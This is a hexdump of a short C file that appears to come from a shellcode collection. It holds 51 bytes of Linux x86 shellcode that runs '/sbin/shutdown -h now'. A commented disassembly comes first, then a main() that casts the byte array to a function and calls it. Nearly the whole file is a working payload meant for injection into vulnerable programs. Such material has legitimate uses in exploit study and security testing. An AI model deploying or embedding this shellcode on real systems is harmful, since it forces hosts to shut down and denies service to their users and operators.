00000000  2f 2a 20 20 4c 69 6e 75  78 20 78 38 36 20 2d 20  |/*  Linux x86 - |
00000010  53 68 75 74 64 6f 77 6e  20 2d 68 20 6e 6f 77 20  |Shutdown -h now |
00000020  2d 20 35 31 20 62 79 74  65 73 0d 0a 20 2a 20 20  |- 51 bytes.. *  |
00000030  4a 6f 6e 61 74 68 61 6e  20 53 61 6c 77 61 6e 20  |Jonathan Salwan |
00000040  6a 73 2e 72 61 63 2e 70  72 6f 6a 65 74 5b 2a 41  |js.rac.projet[*A|
00000050  54 5d 67 6d 61 69 6c 2e  63 6f 6d 0d 0a 20 2a 20  |T]gmail.com.. * |
00000060  20 57 65 62 3a 20 68 74  74 70 3a 2f 2f 77 77 77  | Web: http://www|
00000070  2e 73 68 65 6c 6c 2d 73  74 6f 72 6d 2e 6f 72 67  |.shell-storm.org|
00000080  0d 0a 20 2a 0d 0a 20 2a  0d 0a 20 2a 44 69 73 61  |.. *.. *.. *Disa|
00000090  73 73 65 6d 62 6c 79 20  6f 66 20 73 65 63 74 69  |ssembly of secti|
000000a0  6f 6e 20 2e 74 65 78 74  3a 0d 0a 20 2a 0d 0a 20  |on .text:.. *.. |
000000b0  2a 20 30 38 30 34 38 30  36 30 20 3c 5f 73 74 61  |* 08048060 <_sta|
000000c0  72 74 3e 3a 0d 0a 20 2a  20 38 30 34 38 30 36 30  |rt>:.. * 8048060|
000000d0  3a 20 20 20 20 20 20 20  36 61 20 30 62 20 20 20  |:       6a 0b   |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000f0  70 75 73 68 20 20 20 24  30 78 62 0d 0a 20 2a 20  |push   $0xb.. * |
00000100  38 30 34 38 30 36 32 3a  20 20 20 20 20 20 20 35  |8048062:       5|
00000110  38 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |8               |
00000120  20 20 20 20 20 20 20 70  6f 70 20 20 20 20 25 65  |       pop    %e|
00000130  61 78 0d 0a 20 2a 20 38  30 34 38 30 36 33 3a 20  |ax.. * 8048063: |
00000140  20 20 20 20 20 20 39 39  20 20 20 20 20 20 20 20  |      99        |
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 63 6c  |              cl|
00000160  74 64 0d 0a 20 2a 20 38  30 34 38 30 36 34 3a 20  |td.. * 8048064: |
00000170  20 20 20 20 20 20 35 32  20 20 20 20 20 20 20 20  |      52        |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000190  73 68 20 20 20 25 65 64  78 0d 0a 20 2a 20 38 30  |sh   %edx.. * 80|
000001a0  34 38 30 36 35 3a 20 20  20 20 20 20 20 36 61 20  |48065:       6a |
000001b0  37 37 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |77              |
000001c0  20 20 20 20 20 70 75 73  68 20 20 20 24 30 78 37  |     push   $0x7|
000001d0  37 0d 0a 20 2a 20 38 30  34 38 30 36 37 3a 20 20  |7.. * 8048067:  |
000001e0  20 20 20 20 20 36 36 20  36 38 20 36 65 20 36 66  |     66 68 6e 6f|
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000200  68 77 20 20 24 30 78 36  66 36 65 0d 0a 20 2a 20  |hw  $0x6f6e.. * |
00000210  38 30 34 38 30 36 62 3a  20 20 20 20 20 20 20 38  |804806b:       8|
00000220  39 20 65 36 20 20 20 20  20 20 20 20 20 20 20 20  |9 e6            |
00000230  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 25 65  |       mov    %e|
00000240  73 70 2c 25 65 73 69 0d  0a 20 2a 20 38 30 34 38  |sp,%esi.. * 8048|
00000250  30 36 64 3a 20 20 20 20  20 20 20 35 32 20 20 20  |06d:       52   |
00000260  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000270  20 20 20 70 75 73 68 20  20 20 25 65 64 78 0d 0a  |   push   %edx..|
00000280  20 2a 20 38 30 34 38 30  36 65 3a 20 20 20 20 20  | * 804806e:     |
00000290  20 20 36 36 20 36 38 20  32 64 20 36 38 20 20 20  |  66 68 2d 68   |
000002a0  20 20 20 20 20 20 20 20  20 20 70 75 73 68 77 20  |          pushw |
000002b0  20 24 30 78 36 38 32 64  0d 0a 20 2a 20 38 30 34  | $0x682d.. * 804|
000002c0  38 30 37 32 3a 20 20 20  20 20 20 20 38 39 20 65  |8072:       89 e|
000002d0  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
000002e0  20 20 20 20 6d 6f 76 20  20 20 20 25 65 73 70 2c  |    mov    %esp,|
000002f0  25 65 63 78 0d 0a 20 2a  20 38 30 34 38 30 37 34  |%ecx.. * 8048074|
00000300  3a 20 20 20 20 20 20 20  35 32 20 20 20 20 20 20  |:       52      |
00000310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000320  70 75 73 68 20 20 20 25  65 64 78 0d 0a 20 2a 20  |push   %edx.. * |
00000330  38 30 34 38 30 37 35 3a  20 20 20 20 20 20 20 36  |8048075:       6|
00000340  38 20 36 34 20 36 66 20  37 37 20 36 65 20 20 20  |8 64 6f 77 6e   |
00000350  20 20 20 20 20 20 20 70  75 73 68 20 20 20 24 30  |       push   $0|
00000360  78 36 65 37 37 36 66 36  34 0d 0a 20 2a 20 38 30  |x6e776f64.. * 80|
00000370  34 38 30 37 61 3a 20 20  20 20 20 20 20 36 38 20  |4807a:       68 |
00000380  37 33 20 36 38 20 37 35  20 37 34 20 20 20 20 20  |73 68 75 74     |
00000390  20 20 20 20 20 70 75 73  68 20 20 20 24 30 78 37  |     push   $0x7|
000003a0  34 37 35 36 38 37 33 0d  0a 20 2a 20 38 30 34 38  |4756873.. * 8048|
000003b0  30 37 66 3a 20 20 20 20  20 20 20 36 38 20 36 39  |07f:       68 69|
000003c0  20 36 65 20 32 66 20 32  66 20 20 20 20 20 20 20  | 6e 2f 2f       |
000003d0  20 20 20 70 75 73 68 20  20 20 24 30 78 32 66 32  |   push   $0x2f2|
000003e0  66 36 65 36 39 0d 0a 20  2a 20 38 30 34 38 30 38  |f6e69.. * 804808|
000003f0  34 3a 20 20 20 20 20 20  20 36 38 20 32 66 20 32  |4:       68 2f 2|
00000400  66 20 37 33 20 36 32 20  20 20 20 20 20 20 20 20  |f 73 62         |
00000410  20 70 75 73 68 20 20 20  24 30 78 36 32 37 33 32  | push   $0x62732|
00000420  66 32 66 0d 0a 20 2a 20  38 30 34 38 30 38 39 3a  |f2f.. * 8048089:|
00000430  20 20 20 20 20 20 20 38  39 20 65 33 20 20 20 20  |       89 e3    |
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000450  6f 76 20 20 20 20 25 65  73 70 2c 25 65 62 78 0d  |ov    %esp,%ebx.|
00000460  0a 20 2a 20 38 30 34 38  30 38 62 3a 20 20 20 20  |. * 804808b:    |
00000470  20 20 20 35 32 20 20 20  20 20 20 20 20 20 20 20  |   52           |
00000480  20 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |           push |
00000490  20 20 25 65 64 78 0d 0a  20 2a 20 38 30 34 38 30  |  %edx.. * 80480|
000004a0  38 63 3a 20 20 20 20 20  20 20 35 36 20 20 20 20  |8c:       56    |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004c0  20 20 70 75 73 68 20 20  20 25 65 73 69 0d 0a 20  |  push   %esi.. |
000004d0  2a 20 38 30 34 38 30 38  64 3a 20 20 20 20 20 20  |* 804808d:      |
000004e0  20 35 31 20 20 20 20 20  20 20 20 20 20 20 20 20  | 51             |
000004f0  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
00000500  25 65 63 78 0d 0a 20 2a  20 38 30 34 38 30 38 65  |%ecx.. * 804808e|
00000510  3a 20 20 20 20 20 20 20  35 33 20 20 20 20 20 20  |:       53      |
00000520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000530  70 75 73 68 20 20 20 25  65 62 78 0d 0a 20 2a 20  |push   %ebx.. * |
00000540  38 30 34 38 30 38 66 3a  20 20 20 20 20 20 20 38  |804808f:       8|
00000550  39 20 65 31 20 20 20 20  20 20 20 20 20 20 20 20  |9 e1            |
00000560  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 25 65  |       mov    %e|
00000570  73 70 2c 25 65 63 78 0d  0a 20 2a 20 38 30 34 38  |sp,%ecx.. * 8048|
00000580  30 39 31 3a 20 20 20 20  20 20 20 63 64 20 38 30  |091:       cd 80|
00000590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005a0  20 20 20 69 6e 74 20 20  20 20 24 30 78 38 30 0d  |   int    $0x80.|
000005b0  0a 20 2a 0d 0a 20 2a 2f  0d 0a 0d 0a 6d 61 69 6e  |. *.. */....main|
000005c0  28 29 0d 0a 09 7b 0d 0a  0d 0a 09 09 63 68 61 72  |()...{......char|
000005d0  20 73 68 65 6c 6c 5b 5d  20 3d 20 20 22 5c 78 36  | shell[] =  "\x6|
000005e0  61 5c 78 30 62 5c 78 35  38 5c 78 39 39 5c 78 35  |a\x0b\x58\x99\x5|
000005f0  32 5c 78 36 61 5c 78 37  37 5c 78 36 36 22 0d 0a  |2\x6a\x77\x66"..|
00000600  09 09 09 09 22 5c 78 36  38 5c 78 36 65 5c 78 36  |...."\x68\x6e\x6|
00000610  66 5c 78 38 39 5c 78 65  36 5c 78 35 32 5c 78 36  |f\x89\xe6\x52\x6|
00000620  36 5c 78 36 38 22 0d 0a  09 09 09 09 22 5c 78 32  |6\x68"......"\x2|
00000630  64 5c 78 36 38 5c 78 38  39 5c 78 65 31 5c 78 35  |d\x68\x89\xe1\x5|
00000640  32 5c 78 36 38 5c 78 36  34 5c 78 36 66 22 0d 0a  |2\x68\x64\x6f"..|
00000650  09 09 09 09 22 5c 78 37  37 5c 78 36 65 5c 78 36  |...."\x77\x6e\x6|
00000660  38 5c 78 37 33 5c 78 36  38 5c 78 37 35 5c 78 37  |8\x73\x68\x75\x7|
00000670  34 5c 78 36 38 22 0d 0a  09 09 09 09 22 5c 78 36  |4\x68"......"\x6|
00000680  39 5c 78 36 65 5c 78 32  66 5c 78 32 66 5c 78 36  |9\x6e\x2f\x2f\x6|
00000690  38 5c 78 32 66 5c 78 32  66 5c 78 37 33 22 0d 0a  |8\x2f\x2f\x73"..|
000006a0  09 09 09 09 22 5c 78 36  32 5c 78 38 39 5c 78 65  |...."\x62\x89\xe|
000006b0  33 5c 78 35 32 5c 78 35  36 5c 78 35 31 5c 78 35  |3\x52\x56\x51\x5|
000006c0  33 5c 78 38 39 22 0d 0a  09 09 09 09 22 5c 78 65  |3\x89"......"\xe|
000006d0  31 5c 78 63 64 5c 78 38  30 22 3b 0d 0a 0d 0a 09  |1\xcd\x80";.....|
000006e0  09 70 72 69 6e 74 66 28  22 4c 65 6e 67 74 68 3a  |.printf("Length:|
000006f0  20 25 64 5c 6e 22 2c 73  74 72 6c 65 6e 28 73 68  | %d\n",strlen(sh|
00000700  65 6c 6c 29 29 3b 0d 0a  09 09 28 2a 28 76 6f 69  |ell));....(*(voi|
00000710  64 28 2a 29 28 29 29 20  73 68 65 6c 6c 29 28 29  |d(*)()) shell)()|
00000720  3b 0d 0a 0d 0a 7d                                 |;....}|
00000726
